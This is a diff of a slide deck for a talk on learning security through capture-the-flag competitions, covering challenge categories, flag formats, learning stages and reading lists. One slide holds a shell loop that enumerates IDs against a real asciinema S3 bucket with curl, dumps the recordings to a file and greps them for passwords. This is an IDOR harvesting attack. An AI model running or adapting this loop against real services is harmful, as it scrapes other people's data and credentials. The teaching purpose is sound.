@@ -2,6 +2,7 @@ class: center, middle, inverse
 # capture the flag
 [learning through competition]
 .footnote[View source on [GitHub](https://github.com/audibleblink/ctf-talk)]
+
 ---
 layout: false
 class: center, middle
@@ -15,6 +16,39 @@ class: center, middle, inverse
 ### [[Understanding](#) How You Learn]
 
 ---
+
+## What is it?
+
+--
+
+A collection of challenges designed to test skill. Flags are trophies that prove you've completed a
+challenge.
+
+  * Reverse engineering
+  * Web applications
+  * Crypto
+  * Forensics
+  * Exploitation
+  * Steganography
+  * OS / Network
+
+--
+
+## How do I _win_?
+
+```
+FLAG{d41d8cd98f00b204e9800998ecf8427e}
+CTF{y0ur3_s0_1337_u_f0unD_tHe-fl4g}
+
+# or whatever the CTF rules say the flag format is
+```
+
+- Files
+- Logs
+- Network Packets
+- Metadata
+
+---
 class: inverse
 # Test Case  | __asciinema__
 
@@ -23,7 +57,7 @@ class: inverse
 ---
 
 .left-column[
-# Different Learning Styles
+# Different Learning Stages
 
 ------
 
@@ -33,6 +67,9 @@ class: inverse
 
 ???
 ## Example problem: IDOR on asciinema
+
+#### Answers First
+If I get absolutely stuck, I come here
 
 #### Basics
 
@@ -45,8 +82,25 @@ In fact, you'll need to if you want to 'LEVEL'
 This one is me. I want to learn things that help
 me solve problems directly in front of me.
 
-#### Answers First
-If I get absolutely stuck, I come here
+--
+.right-column[
+### Answer First?
+]
+
+--
+.right-column[
+```sh
+1| base='https://asciinema-bb-eu.s3-eu-west-1.amazonaws.com'
+2| endpoint='/uploads/asciicast/file/_/ascii.cast'
+3| key='?AWSAccessKeyId=xxxx'
+4| for id in $(seq 10000 99999); do
+5|   uri="${base}${endpoint/_/$id}${key}"
+6|   curl -sL $uri >> dump.loot
+7| done
+8| 
+9| grep passw dump.loot
+```
+]
 
 
 --
@@ -65,27 +119,6 @@ Locate from where asciinema pulls the playback information and locate sensitive 
 * RFC 2616  -  Hypertext Transfer Protocol
 * [REST] Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures"
 ]
-
---
-.right-column[
-### Answer First?
-]
-
---
-.right-column[
-```sh
-base='https://asciinema-bb-eu.s3-eu-west-1.amazonaws.com'
-endpoint='/uploads/asciicast/file/_/ascii.cast'
-key='?AWSAccessKeyId=xxxx'
-for id in $(seq 10000 99999); do
-  uri="${base}${endpoint/_/$id}${key}"
-  curl -sL $uri >> dump.loot
-done
-
-grep passw dump.loot
-```
-]
-
 ---
 class: center, middle
 
@@ -180,8 +213,16 @@ class: center, middle, inverse
 .right-column[
 ### How would I automate this?
 ]
+
 ???
-This one is my favorite
+This one is my favorite. It's essentially a different version of 'How do you explain it?'
+
+By automating the solution, you're forced to think about the problem in a deterministic way.
+
+You encounter edge cases that could introduce more learning opportuinities along the way.
+
+EX: Draw an Owl vs. Tell me what an Owl is
+
 ---
 class: center, middle, inverse
 # Show me!
@@ -209,8 +250,8 @@ invite code.
 
 --
 
-* Use BURPSuite to see calls that are made
 * Manually inspect all non-standard globally define functions
+* Use BURPSuite to see calls that are made
 
 --
 
@@ -285,29 +326,22 @@ https://youtube.com/ippsec
 .right-column[
 ##**Reverse Engineering** - _Practical Reverse Engineering_
 ]
---
 .right-column[
 ##**Scripting** - _Violent Python_
 ]
---
 
 .right-column[
 ##**Web** - _Web Application Hackers Handbook_
 ]
 
---
-
 .right-column[
 ##**Crypto** - _Applied Cryptography_
 ]
-
---
 
 .right-column[
 ##**Binary Exploitation** - _Hacking: The Art of Exploitation_
 ]
 
---
 
 .right-column[
 ##**All-In-One** - https://trailofbits.github.io/ctf/
